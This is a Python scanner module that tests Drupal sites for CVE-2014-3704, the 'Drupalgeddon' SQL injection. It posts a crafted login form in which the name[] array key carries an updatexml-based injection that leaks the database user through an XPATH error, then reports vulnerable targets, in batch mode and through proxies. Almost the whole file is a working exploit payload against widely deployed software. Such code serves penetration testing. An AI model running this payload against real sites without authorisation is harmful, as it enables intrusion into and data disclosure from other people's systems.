#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()
class Cve_2014_3704:
    def run(self,baseurl):
        url = baseurl + '/?q=node&destination=node'
        header = {
            "User-Agent":self.headers,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a"
        try:
            req = requests.post(url,proxies=self.proxy,verify=self.ssl,headers=header,data=data)
            if "XPATH" in req.text:
                OutPrintInfoSuc("Drupal",f"存在CVE-2014-3704-SQL漏洞{url}")
                if self.batch:
                    OutPutFile("drupal_2014_3704.txt",f"存在CVE-2014-3704-SQL漏洞{url}")
            else:
                if not self.batch:
                    OutPrintInfo("Drupal", "不存在CVE-2014-3704-SQL漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Drupal", "不存在CVE-2014-3704-SQL漏洞")
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.headers = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]

        if not self.batch:
            req = ReqSet(proxy=proxy)
            self.proxy = req["proxy"]

        else:
            self.proxy = {"http": proxy, "https": proxy}

        if not self.batch:
            OutPrintInfo("Drupal", "开始检测CVE-2014-3704-SQL漏洞...")
        self.run(url)
        if not self.batch:
            OutPrintInfo("Drupal", "CVE-2014-3704-SQL漏洞检测结束")
